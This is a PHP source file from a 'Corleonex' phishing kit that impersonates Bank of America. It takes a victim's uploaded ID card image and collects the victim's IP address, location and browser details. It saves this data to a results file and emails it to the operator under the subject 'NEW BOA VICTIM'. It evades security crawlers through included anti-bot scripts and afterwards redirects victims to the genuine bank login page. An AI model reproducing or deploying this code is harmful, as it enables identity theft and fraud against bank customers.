<?php
ob_start();
session_start();



include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/bot-corleonex.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if (!isset($_SESSION['login_SESSION'])) {
  header("Location: ../../index");
  exit();
}

if(isset($_FILES['file']['name'])){
  include '../../admin/YOUR-CONFIG.php';
  include '../Functions/Fuck-you.php';

    /* Getting file name */
   $filename = $_FILES['file']['name'];

   /* Location */
   $location = "upload/corleonex-id-".uniqid().$filename;
   $imageFileType = pathinfo($location,PATHINFO_EXTENSION);
   $imageFileType = strtolower($imageFileType);

   /* Valid extensions */
   $valid_extensions = array("jpg","jpeg","png");

   $response = 0;
   /* Check file extension */
   if(in_array(strtolower($imageFileType), $valid_extensions)) {
      /* Upload file */
      if(move_uploaded_file($_FILES['file']['tmp_name'],$location)){
         $response = $location;
      }
   }


   $link = 'http://' . $_SERVER[HTTP_HOST] . $_SERVER[REQUEST_URI];
   $fullfileelink = str_replace("Mail5.php", "", $link) ."/".$response;


  $hi="#---------------------------[ Corleonex ID CARD  ]----------------------------#\r\n";
  $hi.="ID CARD : " . $_SERVER['HTTP_HOST']. '/'.$fullfileelink;
  $hi.="#---------------------------[ Corleonex IP INFO ]----------------------------#\r\n";
  $hi.="IP ADDRESS  : {$_SESSION['ip']}\r\n";
  $hi.="IP COUNTRY  : {$_SESSION['country']}\r\n";
  $hi.="IP CITY : {$_SESSION['city']}\r\n";
  $hi.="BROWSER   : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
  $hi.="TIME    : ".date("d/m/Y h:i:sa")." GMT\r\n";
  $hi.="#---------------------------[ Corleonex IP INFO  ]----------------------------#\r\n";

    $save=fopen("../Boa_Result/id.txt","a+");
    fwrite($save,$hi);
    fclose($save);

  $subject=" Corleonex -NEW BOA VICTIM NEW ID CARD   * " .$_POST['username'] . " * FROM ". $_SESSION['country'] ;
  $headers="From: BANK OF AMERICA CORLEONEX  <boa@corleonex.dz>\r\n";
  $headers.="MIME-Version: 1.0\r\n";
  $headers.="Content-Type: text/plain; charset=UTF-8\r\n";

    @mail($your_email,$subject,$hi,$headers);
    
       $key = substr(sha1(mt_rand()),1,25);

        if ($show_success_page=="yes") {
      exit("thanks?boa_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']); 
       }else{

    $helper = array_keys($_SESSION);
        foreach ($helper as $key){
            unset($_SESSION[$key]);
          }
        exit("https://bit.ly/20wy0Cx"); // go to bank login page officiel..
       }


  }else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>
